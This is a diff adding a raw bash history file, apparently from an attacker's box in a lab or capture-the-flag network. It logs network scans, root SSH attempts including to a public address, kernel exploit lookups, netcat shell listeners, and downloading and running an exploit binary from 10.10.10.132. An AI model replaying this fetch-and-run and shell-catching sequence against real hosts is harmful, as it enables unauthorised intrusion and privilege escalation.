@@ -1,0 +1,427 @@
+ 1  nmap -A 10.10.10.254
+    2  exit
+    3  cd /var/www
+    4  ls
+    5  nc 10.10.10.132 4445 -v
+    6  nc 10.10.10.132 4446 -v
+    7  vi /etc/motd
+    8  vi /etc/ssh/
+    9  nc 10.10.10.132 999
+   10  nc 10.10.10.132 2323
+   11  ifconfig
+   12  searchsploit
+   13  ls /flag.txt 
+   14  ls
+   15  vi flag.txt
+   16  vi /etc/ssh/ssh_config
+   17  vi /root/.ssh/known_hosts
+   18  ls -all
+   19  chmod 777 flag.txt
+   20  ls -l
+   21  vi flag.txt
+   22  cat flag.txt
+   23  vi .xsession-errors
+   24  nc 10.10.10.132 2323
+   25  ls
+   26  cd Desktop
+   27  ls
+   28  ls -all
+   29  ls all
+   30  ls -all
+   31  vi /root/.ssh/known_hosts
+   32  ssh root@10.10.10.132
+   33  exit
+   34  ls
+   35  rm flag.txt
+   36  ls
+   37  ifconfig
+   38  beebox
+   39  ls
+   40  cd Desktop/op
+   41  cd Desktop/
+   42  ls
+   43  cd /
+   44  ping 10.10.10.2
+   45  ping 10.10.10.131
+   46  nmap -A 10.10.10.131
+   47  telnet 10.10.10.131
+   48  telnet 10.10.10.2
+   49  nmap -A 10.10.10.2
+   50  ssh 10.10.10.131
+   51  ls
+   52  ssh root@10.10.10.2
+   53  ls -all
+   54  vi /root/.gnome2_private
+   55  ps ax
+   56  w -f
+   57  ps ax
+   58  ifconfig
+   59  exit
+   60  nc 10.10.10.32 2323
+   61  id
+   62  nc 10.10.10.32 2323
+   63  exit
+   64  xit
+   65  exit
+   66  apt-get install openssh-server
+   67  update-rc.d -f ssh remove
+   68  update-rc.d -f ssh defaults
+   69  chkconfig ssh
+   70  apt-get install chkconfig
+   71  apt-get update
+   72  sudo apt-get update
+   73  apt-get install chkconfig
+   74  install yum install gcc -y 
+   75  ls -all
+   76  vi /etc/ssh/sshd_config
+   77  who
+   78  ls
+   79  cat /etc/*-release
+   80  clear
+   81  exit
+   82  ssh root@localhost
+   83  ls -all
+   84  vi /root/..
+   85  apt-get install iptables
+   86  yum install iptables
+   87  ls -all
+   88  vi /etc/motd
+   89  ssh root@localhost
+   90  vi /root/.ssh/known_host
+   91  vi /root/.ssh/known_hosts
+   92  ssh root@localhost
+   93  ssh root@localhost
+   94  ls -all
+   95  ssh root@10.10.10.131:80 -p
+   96  ssh root@23.254.101.209:2021 -p
+   97  ssh root@10.10.10.131:80 --p
+   98  ssh root@23.254.101.209:2021 --p
+   99  ssh root@10.10.10.131:80 --p
+  100  ssh root@10.10.10.132:80 --p
+  101  -ssh root@10.10.10.132:80 --p
+  102  ls
+  103  cd ..
+  104  ls
+  105  cd etc
+  106  cd root
+  107  ls
+  108  cd ssh
+  109  ls
+  110  cd root
+  111  ls
+  112  cd passwd
+  113  cd ..
+  114  ls
+  115  cd mnt
+  116  ls
+  117  cd ..
+  118  cd usr
+  119  ls
+  120  cd ..
+  121  cd opt
+  122  ls
+  123  cd ..
+  124  cd ru
+  125  cd run
+  126  ls
+  127  cd ..
+  128  ls
+  129  cd sus
+  130  cd sys
+  131  ls
+  132  cd ..
+  133  ssh root@10.10.10.131:80 --
+  134  exit
+  135  ls
+  136  cd Desktop
+  137  ls
+  138  cd ..
+  139  ls
+  140  cd home
+  141  ls
+  142  cd root
+  143  ls
+  144  cd Desktop
+  145  ls
+  146  cd ..
+  147  cd .
+  148  cd ..
+  149  ls
+  150  cd media]
+  151  cd media
+  152  ls
+  153  cd ..
+  154  cd sbin
+  155  ls
+  156  cd ..
+  157  ls
+  158  cd var
+  159  ls
+  160  cd www
+  161  ls
+  162  open?
+  163  run index.html
+  164  help
+  165  read index.html
+  166  exec index.html
+  167  ls
+  168  rmdir index.html
+  169  open index.html
+  170  ifconfig
+  171  exit
+  172  ls
+  173  cd Desktop
+  174  ls
+  175  cd ..
+  176  ls
+  177  cd home
+  178  ls
+  179  cd root
+  180  ls
+  181  cd Desktop
+  182  ls
+  183  cd ..
+  184  exit
+  185  ssh root@10.10.10.131
+  186  ssh root@23.254.101.209:80
+  187  ssh root@23.254.101.209
+  188  ssh root@23.254.101.209:2021
+  189  ssh root@23.254.101.209 -p 2021
+  190  ls
+  191  cd ..
+  192  ls
+  193  cd root
+  194  cd vi
+  195  cd ..
+  196  cd etc
+  197  ls
+  198  cd motd
+  199  ls
+  200  cd ..
+  201  clear
+  202  ls
+  203  cd boot
+  204  ls
+  205  cd ..
+  206  ls
+  207  cd media
+  208  ls
+  209  cd ..
+  210  ls
+  211  cd lib
+  212  ls
+  213  cd init
+  214  ls
+  215  cd ..
+  216  ls
+  217  cd ..
+  218  ls
+  219  cd srv
+  220  ls
+  221  cd tftp
+  222  ls
+  223  cd ..
+  224  ls
+  225  cd bin
+  226  exit
+  227  ifconfig
+  228  ssh user@10.10.10.131:80 --p
+  229  restart ssh
+  230  sudo pacman -S openssh
+  231  openssh
+  232  service ssh status
+  233  ssh root@localhost
+  234  ssh root@10.10.10.132
+  235  ls
+  236  cd Desktop
+  237  ls
+  238  cd .
+  239  cd ..
+  240  ssh root@10.10.10.132:80
+  241  ssh root@10.10.10.132
+  242  exit
+  243  ls
+  244  exit
+  245  ls
+  246  cd ..
+  247  ls
+  248  cd media
+  249  cd ..
+  250  ssh root@localhost
+  251  exit
+  252  cd ..
+  253  ls
+  254  cd home
+  255  ls
+  256  cd root
+  257  ls
+  258  cd Desktop
+  259  ls
+  260  cd ..
+  261  ls
+  262  cd media
+  263  ls
+  264  cd ..
+  265  cd opt
+  266  ls
+  267  cd ..
+  268  cd usr
+  269  ls
+  270  cd share
+  271  ls
+  272  cd ..
+  273  clear
+  274  ls
+  275  cd  ver
+  276  cd var
+  277  ls
+  278  cd run
+  279  ls
+  280  cd ..
+  281  open apache2.pid
+  282  cd ..
+  283  exit
+  284  ssh root@10.10.10.131
+  285  ssh root@23.254.101.209
+  286  exit
+  287  who
+  288  history
+  289  cd /var/www
+  290  ls
+  291  exit
+  292  nc 10.10.10.132 2323
+  293  nc 10.10.10.132 2323
+  294  who
+  295  ls
+  296  cd /var/www/ht
+  297  ls
+  298  cd /var/www/
+  299  ls
+  300  rm -fr root.c
+  301  ls
+  302  rm -fr 5093.c 
+  303  ls
+  304  vim aa.txt
+  305  rm -fr aa.txt
+  306  ls
+  307  vim vuln.txt
+  308  ls
+  309  rm -fr vuln.txt 
+  310  vim shell.txt
+  311  ls
+  312  nc -v -n -l -p 2234
+  313  history
+  314  ls
+  315  history
+  316  ls
+  317  who
+  318  nc -v -n -l -p 2234
+  319  who
+  320  history
+  321  nc -v -n -l -p 2234
+  322  who
+  323  nc -v -n -l -p 2234
+  324  aa
+  325  history
+  326  ls
+  327  cd /var/www/
+  328  ls
+  329  cd ..
+  330  ls
+  331  cd opt
+  332  ls
+  333  cd ..
+  334  ls
+  335  cd ~
+  336  ls
+  337  cd /tool
+  338  cd /toolbox
+  339  ls
+  340  cd ..
+  341  ls
+  342  cd ~
+  343  ls
+  344  rm -fr exploits 
+  345  ssh root@10.10.10.132
+  346  ls
+  347  cd /var/www/ht
+  348  ls
+  349  cd /var/www/ht
+  350  ls
+  351  cd /var/www
+  352  ls
+  353  ls -lah
+  354  vim aa.c
+  355  rm -fr aa.c
+  356  vim aa.c
+  357  service apache status
+  358  service apache2 status
+  359  service apache2 restart
+  360  nc -v -n -l -p 2234
+  361  pkill
+  362  nc -v -n -l -p 2234
+  363  pkill nc
+  364  nc -v -n -l -p 2234
+  365  ls
+  366  who
+  367  ls
+  368  netstats
+  369  history
+  370  ls
+  371  cd Desktop/
+  372  ls
+  373  cd ..
+  374  ls
+  375  history
+  376  ls
+  377  netstat
+  378  ssh root@localhost -p 41549
+  379  cd /var/www/ht
+  380  ls
+  381  cd /var/www
+  382  ls
+  383  vi test.c
+  384  service apache2 status
+  385  cd /var/www/
+  386  vi root.c
+  387  service apache2 status
+  388  ssh root@10.10.10.132
+  389  cd /var/www
+  390  ls
+  391  nmap -F -O 10.10.10.132
+  392  searchsploit 2.6.24
+  393  cd /usr/share
+  394  ls
+  395  cd exploitdb/
+  396  ls
+  397  cd platforms
+  398  cd linux
+  399  cp 5093.c /var/www
+  400  ls
+  401  cd local
+  402  ls
+  403  cp 5093.c /var/www
+  404  cd /var/www
+  405  uname -a
+  406  cat /etc/*-release
+  407  clear
+  408  ifconfig -a
+  409  ls
+  410  clear
+  411  nmap -F -O -sS -sP 10.10.10.0/24
+  412  nmap -F -O -sS -sV 10.10.10.0/24
+  413  wget http://10.10.10.132/exploits
+  414  ls
+  415  chmod +x exploits
+  416  ls
+  417  ./exploits 
+  418  ls -lah
+  419  strace exploits
+  420  exploit6
+  421  istory
+  422  ifconfig 
+  423  exploit6 eth0 10.10.10.132
+  424  ssh luosten@10.10.10.132
+  425  exit
+  426  ls --all
+  427  history
